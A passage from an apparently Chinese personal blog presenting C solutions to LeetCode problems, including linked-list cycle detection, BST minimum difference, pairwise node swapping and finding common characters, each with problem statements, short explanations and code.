title="解法一：快慢指针"></a>解法一：快慢指针</h4><p>老快慢指针人了，<strong>只要链表中存在环那么在遍历过程中步长不一的快慢指针肯定会相遇</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(struct ListNode *head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr1</span> = <span class="title">head</span>, *<span class="title">ptr2</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(ptr1 &amp;&amp; ptr2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ptr1 == ptr2)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        ptr1 = ptr1-&gt;next;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!ptr2)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/09/PtGJv5EIz3RgAWd.png" alt="image.png"></p><h4 id="解法二：利用题目数据范围漏洞"><a href="#解法二：利用题目数据范围漏洞" class="headerlink" title="解法二：利用题目数据范围漏洞"></a>解法二：利用题目数据范围漏洞</h4><p>题目保证结点数量小于10000，那么<strong>只要遍历能循环超过10000次，链表中就必定存在回路</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(struct ListNode *head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        n++;</span><br><span class="line">        <span class="keyword">if</span>(n &gt; <span class="number">10000</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfJ6e.png" alt="wXfJ6e.png"></p><h3 id="10-142-环形链表-II（中等）"><a href="#10-142-环形链表-II（中等）" class="headerlink" title="10 - 142. 环形链表 II（中等）"></a>10 - <a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/" target="_blank" rel="noopener">142. 环形链表 II（中等）</a></h3><blockquote><p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p><p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p><p>说明：不允许修改给定的链表。</p><p>示例 1：</p><p>输入：head = [3,2,0,-4], pos = 1<br>输出：tail connects to node index 1<br>解释：链表中有一个环，其尾部连接到第二个节点。</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="image.png"></p><p>示例 2：</p><p>输入：head = [1,2], pos = 0<br>输出：tail connects to node index 0<br>解释：链表中有一个环，其尾部连接到第一个节点。</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="image.png"></p><p>示例 3：</p><p>输入：head = [1], pos = -1<br>输出：no cycle<br>解释：链表中没有环。</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="image.png"></p><p>进阶：<br>你是否可以不用额外空间解决此题？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-cycle-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法一：哈希表"><a href="#解法一：哈希表" class="headerlink" title="解法一：哈希表"></a>解法一：哈希表</h4><p>用一个表收集已经遍历过的结点，每遍历过一个结点看这个结点是否在表内即可</p><p>当然，每次都要在表内寻找结点，时间复杂度最坏是<strong>O</strong>(<strong>N^2</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode *<span class="title">detectCycle</span><span class="params">(struct ListNode *head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">map</span>[10000];</span></span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;index;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(head == <span class="built_in">map</span>[i])</span><br><span class="line">                <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">map</span>[index++] = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行时间十分惨不忍睹</p></blockquote><p><img src="https://i.loli.net/2020/10/10/9kICpfDBudOlQUF.png" alt="image.png"></p><h4 id="解法二：快慢指针"><a href="#解法二：快慢指针" class="headerlink" title="解法二：快慢指针"></a>解法二：快慢指针</h4><p>我们可以用步长分别为1、2的两个指针遍历该链表，思考如下事实：</p><p><img src="https://i.loli.net/2020/10/10/Mo8YQgWPSTHKRwD.png" alt="BFACBC2D2E0D388B926508F2A850E287.png"></p><p>当快慢指针相遇后，<strong>慢指针从环的起始点走了距离b</strong>，若是从该时刻开始有一个指针从链表头与慢指针同步长遍历，当两指针相遇时，两个指针分别都走了距离a，<strong>此时慢指针总共从环的起始点走了a+b = n*b + n*c 的距离，刚好回到起始点</strong>，这样我们就找到环的起始点了</p><p>构造代码如下：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode *<span class="title">detectCycle</span><span class="params">(struct ListNode *head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">slow_ptr</span> = <span class="title">head</span>, *<span class="title">fast_ptr</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(slow_ptr &amp;&amp; fast_ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        slow_ptr = slow_ptr-&gt;next;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!fast_ptr)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(slow_ptr == fast_ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            slow_ptr = slow_ptr-&gt;next;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> = <span class="title">head</span>;</span></span><br><span class="line">            <span class="keyword">while</span>(ptr != slow_ptr)</span><br><span class="line">            &#123;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                slow_ptr = slow_ptr-&gt;next;                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/10/YJ9p1S3ryl6jkuM.png" alt="_3E__5BJH58~HSP__SZ_ZD5.png"></p><h3 id="11-416-分割等和子集（中等）"><a href="#11-416-分割等和子集（中等）" class="headerlink" title="11 - 416. 分割等和子集（中等）"></a>11 - <a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/" target="_blank" rel="noopener">416. 分割等和子集（中等）</a></h3><blockquote><p>给定一个只包含正整数的非空数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p><p>注意:</p><p>每个数组中的元素不会超过 100<br>数组的大小不会超过 200<br>示例 1:</p><p>输入: [1, 5, 11, 5]</p><p>输出: true</p><p>解释: 数组可以分割成 [1, 5, 5] 和 [11].</p><p>示例 2:</p><p>输入: [1, 2, 3, 5]</p><p>输出: false</p><p>解释: 数组不能分割成两个元素和相等的子集.</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/partition-equal-subset-sum" target="_blank" rel="noopener">https://leetcode-cn.com/problems/partition-equal-subset-sum</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>DP，01背包变种，题解先咕咕咕（</p><h3 id="12-530-二叉搜索树的最小绝对差（简单）"><a href="#12-530-二叉搜索树的最小绝对差（简单）" class="headerlink" title="12 - 530. 二叉搜索树的最小绝对差（简单）"></a>12 - <a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/" target="_blank" rel="noopener">530. 二叉搜索树的最小绝对差（简单）</a></h3><blockquote><p>给你一棵所有节点为非负值的二叉搜索树，请你计算树中任意两节点的差的绝对值的最小值。</p><p>示例：</p><p>输入：</p><p>   1<br>    <br>     3<br>    /<br>   2</p><p>输出：<br>1</p><p>解释：<br>最小绝对差为 1，其中 2 和 1 的差的绝对值为 1（或者 2 和 3）。</p><p>提示：</p><p>树中至少有 2 个节点。<br>本题与 783 <a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/</a> 相同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法：深度优先搜索-中序遍历"><a href="#解法：深度优先搜索-中序遍历" class="headerlink" title="解法：深度优先搜索 + 中序遍历"></a>解法：深度优先搜索 + 中序遍历</h4><p>因为是二叉搜索树，所以当进行中序遍历时肯定会按照从小到大的结点进行遍历</p><p>最小绝对差肯定出现在相邻值结点中，这里就不再过多赘叙了</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> pre = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(pre == <span class="number">-1</span>)</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ans = (root-&gt;val - pre) &lt; ans ? (root-&gt;val - pre) : ans;</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pre = <span class="number">-1</span>;</span><br><span class="line">    ans = <span class="number">0xffff</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/12/EUzkxuqK2ja4cFl.png" alt="image.png"></p><h3 id="13-24-两两交换链表中的节点（中等）"><a href="#13-24-两两交换链表中的节点（中等）" class="headerlink" title="13 - 24.两两交换链表中的节点（中等）"></a>13 - <a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/" target="_blank" rel="noopener">24.两两交换链表中的节点（中等）</a></h3><blockquote><p>给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。</p><p>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</p><p>示例:</p><p>给定 1-&gt;2-&gt;3-&gt;4, 你应该返回 2-&gt;1-&gt;4-&gt;3.</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs" target="_blank" rel="noopener">https://leetcode-cn.com/problems/swap-nodes-in-pairs</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>很简单的一个交换结点的题，两两交换即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">swapPairs</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span>, *<span class="title">temp2</span> = <span class="title">head</span>-&gt;<span class="title">next</span>-&gt;<span class="title">next</span>, *<span class="title">temp3</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>)), *<span class="title">retn</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">    temp3-&gt;next = head;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!head-&gt;next)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        temp2 = head-&gt;next-&gt;next;</span><br><span class="line">        temp = head-&gt;next;</span><br><span class="line">        temp3-&gt;next = temp;</span><br><span class="line">        temp-&gt;next = head;</span><br><span class="line">        head-&gt;next = temp2;</span><br><span class="line">        temp3 = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/10/14/WenKdZaqkslmrFg.png" alt="image.png" style="zoom:50%;" /><h3 id="14-1002-查找常用字符（简单）"><a href="#14-1002-查找常用字符（简单）" class="headerlink" title="14 - 1002. 查找常用字符（简单）"></a>14 - <a href="https://leetcode-cn.com/problems/find-common-characters/" target="_blank" rel="noopener">1002. 查找常用字符（简单）</a></h3><blockquote><p>给定仅有小写字母组成的字符串数组 A，返回列表中的每个字符串中都显示的全部字符（包括重复字符）组成的列表。例如，如果一个字符在每个字符串中出现 3 次，但不是 4 次，则需要在最终答案中包含该字符 3 次。</p><p>你可以按任意顺序返回答案。</p><p>示例 1：</p><p>输入：[“bella”,”label”,”roller”]<br>输出：[“e”,”l”,”l”]<br>示例 2：</p><p>输入：[“cool”,”lock”,”cook”]<br>输出：[“c”,”o”]</p><p>提示：</p><p>1 &lt;= A.length &lt;= 100<br>1 &lt;= A[i].length &lt;= 100<br>A[i][j] 是小写字母</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/find-common-characters" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-common-characters</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>直接一个个数即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> ** <span class="title">commonChars</span><span class="params">(<span class="keyword">char</span> ** A, <span class="keyword">int</span> ASize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ** retn = (<span class="keyword">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">void</span>*) * <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">int</span> ** count = (<span class="keyword">int</span>**)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>*), <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">        count[i] = (<span class="keyword">int</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">30</span>);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ASize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *ptr = A[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;ptr[j];j++)</span><br><span class="line">            count[i][ptr[j]-<span class="string">'a'</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">0xffff</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;ASize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(count[j][i] == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">min</span> = <span class="built_in">min</span> &gt; count[j][i] ? count[j][i] : <span class="built_in">min</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">min</span>;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                retn[*returnSize] = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">2</span>);</span><br><span class="line">                retn[*returnSize][<span class="number">0</span>] = <span class="string">'a'</span> + i;</span><br><span class="line">                retn[(*returnSize)++][<span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![7RM_2__VRFRFEI`8__F5YZW.png](<a href="https://i.loli.net/2020/10/14/Hu76mRdEKPnQY1b.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/14/Hu76mRdEKPnQY1b.png</a>)</p><h3 id="15-116-填充每个节点的下一个右侧节点指针（中等）"><a href="#15-116-填充每个节点的下一个右侧节点指针（中等）" class="headerlink" title="15 - 116. 填充每个节点的下一个右侧节点指针（中等）"></a>15 - <a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node/" target="_blank" rel="noopener">116. 填充每个节点的下一个右侧节点指针（中等）</a></h3><blockquote><p>给定一个完美二叉树，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p><p>初始状态下，所有 next 指针都被设置为 NULL。</p><p>示例：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/116_sample.png" alt="image.png"></p><p>输入：{“$id”:”1”,”left”:{“$id”:”2”,”left”:{“$id”:”3”,”left”:null,”next”:null,”right”:null,”val”:4},”next”:null,”right”:{“$id”:”4”,”left”:null,”next”:null,”right”:null,”val”:5},”val”:2},”next”:null,”right”:{“$id”:”5”,”left”:{“$id”:”6”,”left”:null,”next”:null,”right”:null,”val”:6},”next”:null,”right”:{“$id”:”7”,”left”:null,”next”:null,”right”:null,”val”:7},”val”:3},”val”:1}</p><p>输出：{“$id”:”1”,”left”:{“$id”:”2”,”left”:{“$id”:”3”,”left”:null,”next”:{“$id”:”4”,”left”:null,”next”:{“$id”:”5”,”left”:null,”next”:{“$id”:”6”,”left”:null,”next”:null,”right”:null,”val”:7},”right”:null,”val”:6},”right”:null,”val”:5},”right”:null,”val”:4},”next”:{“$id”:”7”,”left”:{“$ref”:”5”},”next”:null,”right”:{“$ref”:”6”},”val”:3},”right”:{“$ref”:”4”},”val”:2},”next”:null,”right”:{“$ref”:”7”},”val”:1}</p><p>解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。</p><p>提示：</p><p>你只能使用常量级额外空间。<br>使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node" target="_blank" rel="noopener">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：本题和2020.9.28的每日一题几乎完全一样</p></blockquote><h4 id="解法一：层次遍历-1"><a href="#解法一：层次遍历-1" class="headerlink" 